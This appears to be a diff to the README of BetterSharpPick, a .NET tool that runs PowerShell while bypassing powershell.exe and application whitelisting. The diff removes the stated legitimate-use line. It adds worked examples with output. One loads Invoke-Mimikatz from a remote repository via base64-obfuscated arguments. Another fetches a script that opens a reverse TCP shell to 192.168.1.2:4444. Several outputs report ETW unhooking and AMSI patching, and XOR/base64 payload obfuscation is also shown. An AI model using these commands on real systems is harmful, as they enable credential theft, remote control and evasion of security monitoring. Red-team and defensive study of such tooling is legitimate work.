@@ -1,6 +1,6 @@
 # BetterSharpPick
 
-BetterSharpPick is a .NET tool that runs PowerShell code **without calling `powershell.exe` directly**. It’s intended for legitimate security testing and blue/red team workflows in environments with restrictive policies (e.g., AppLocker).
+BetterSharpPick is a .NET tool that runs PowerShell code **without calling `powershell.exe` directly**. 
 
 > Legal & Ethical Use
 > 
@@ -15,13 +15,6 @@ BetterSharpPick is a .NET tool that runs PowerShell code **without calling `powe
 - **Scoped Base64 decoding** with `b64` (applies only to the next option you put it in front of)
 - **Single-byte XOR decoding for file/URL payloads only** (`xor <0-255>`)
 - Optional TLS protocol configuration
-
-## Build
-
-```bash
-dotnet build -c Release
-# Use the produced exe (e.g., bin/Release/.../BetterSharpPick.exe)
-```
 
 ## Usage
 
@@ -79,49 +72,70 @@ BetterSharpPick.exe [options]
 
 Run a local payload:
 
-```bash
-BetterSharpPick.exe -path .\script.ps1
-```
+    BetterSharpPick.exe -path .\script.ps1
 
 Run a payload from URL:
 
-```bash
-BetterSharpPick.exe -path https://example.com/payload.ps1
-```
+    BetterSharpPick.exe -path https://example.com/payload.ps1
 
 Run an inline command:
 
-```bash
-BetterSharpPick.exe -c "Get-Process | Select-Object -First 5"
-```
+    BetterSharpPick.exe -c "Get-Process | Select-Object -First 5"
+
+Run mimikatz:
+
+    BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvcmVmcy9oZWFkcy9tYXN0ZXIvR2F0aGVyL0ludm9rZS1NaW1pa2F0ei5wczE= -arg     SW52b2tlLU1pbWlrYXR6IC1Db21tYW5kICJjb2ZmZWUgZXhpdCI= -raw
+    [+] ~MustafaNafizDurukan #BetterSharpPick
+    [+] URL/PATH : https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Gather/Invoke-Mimikatz.ps1
+    [+] Argument : Invoke-Mimikatz -Command "coffee exit"
+    [+] Successfully unhooked ETW!
+    [+] Successfully patched AMSI!
+    
+      .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11
+     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+    
+    mimikatz(powershell) # coffee
+    
+        ( (
+         ) )
+      .______.
+      |      |]
+      \      /
+       `----'
+    
+    mimikatz(powershell) # exit
+    Bye!
 
 Base64-encoded **inline** command (scope `-b64` to `-c`):
 
-```bash
-# "V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn" => Write-Host 'Hello World'
-BetterSharpPick.exe -b64 -c V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn
-```
+    BetterSharpPick.exe -b64 -c V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQn
+    [+] ~MustafaNafizDurukan #BetterSharpPick
+    [+] Command : Write-Host 'Hello World'
+    [+] Successfully unhooked ETW!
+    [+] Successfully patched AMSI!
+    Hello World
 
 Base64-encoded **argument** (scope `-b64` to each `-arg` you want decoded):
 
-```bash
-# -path "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
-# -arg "Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 4444"
-BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvbWFzdGVyL1NoZWxscy9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczE= -arg SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxOTIuMTY4LjEuMiAtUG9ydCA0NDQ0 -raw
-```
+    BetterSharpPick.exe -b64 -path aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcvbWFzdGVyL1NoZWxscy9JbnZva2UtUG93ZXJTaGVsbFRjcC5wczE= -arg SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxOTIuMTY4LjEuMiAtUG9ydCA0NDQ0 -raw
+    [+] ~MustafaNafizDurukan #BetterSharpPick
+    [+] URL/PATH : https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+    [+] Argument : Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 4444
+    [+] Successfully unhooked ETW!
+    [+] Successfully patched AMSI!
 
 Base64 on the **payload** + XOR on the **payload** (XOR applies only to `-path`):
 
-```bash
-# -b64 only scopes to -path; XOR applies to the decoded file/URL payload
-BetterSharpPick.exe -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLnBzMQ==
-```
+    # -b64 only scopes to -path; XOR applies to the decoded file/URL payload
+    BetterSharpPick.exe -xor 140 -b64 -path aHR0cHM6Ly9leGFtcGxlLmNvbS9wYXlsb2FkLnBzMQ==
 
 No Base64 anywhere if `-b64` is not placed before an option:
 
-```bash
-BetterSharpPick.exe -path .\plain.ps1 -arg simple
-```
+    BetterSharpPick.exe -path .\plain.ps1 -arg simple
 
 ## Built-in Help (CLI)
 
@@ -132,7 +146,7 @@ USAGE:
 DESCRIPTION:
   -path <value>   : Payload file path or URL.
   -c <value>      : Inline PowerShell code.
-  -arg <string>  : Argument to pass (repeatable).
+  -arg <string>   : Argument to pass (repeatable).
 
   -b64            : Scoped base64. Applies ONLY to the NEXT option’s value.
                     Put -b64 directly before -path, -c, or -arg if that value is base64-encoded.
@@ -142,7 +156,7 @@ DESCRIPTION:
                     Does NOT apply to -c or -arg.
                     If used together with -b64 (scoped to -path), decoding order is: Base64 → XOR.
   
-  -raw     : Affects only the payload content read via -path.
+  -raw            : Affects only the payload content read via -path.
                     Treat the -path payload as RAW text; Do NOT apply Base64/XOR.
                     Does not affect -c or -arg.
 
